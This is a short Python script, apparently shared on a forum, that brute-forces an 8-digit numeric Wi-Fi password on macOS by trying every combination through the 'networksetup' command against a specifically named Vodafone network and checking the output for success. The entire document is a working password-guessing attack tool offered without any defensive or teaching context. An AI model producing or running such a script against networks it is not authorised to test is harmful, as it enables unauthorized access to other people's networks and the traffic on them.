import os
import subprocess
 
for y in range(0, 10):
           for z in range(0, 10):
               for l in range(0, 10):
                   for m in range(0, 10):
                       for n in range(0, 10):
                           for o in range(0, 10):
                               for p in range(0, 10):
                                   for q in range (0,10):
                                       password=[y,z,l,m,n,o,p,q]
                                       str1 = ''.join(str(e)for e in password)
                                       print (&quot;trying pass &quot;,str1)
                                       proc = subprocess.Popen([&quot;networksetup&quot;, &quot;-setairportnetwork&quot;,&quot;en0&quot;,&quot;Vodafone_ADSL_903F&quot;,str1],stdout=subprocess.PIPE)
                                       x=proc.stdout.readline()
                                       try:
                                         if (x[0]=='F'): # output generated if password os wrong is&quot;False network password&quot; so I take the first letter F and check it
                                             print(&quot;trying next password&quot;)
                                       except IndexError : #if password is correct there's no command reply hence no string to access it with x[0]
                                             print(&quot;Password found !&quot;)
                                             break
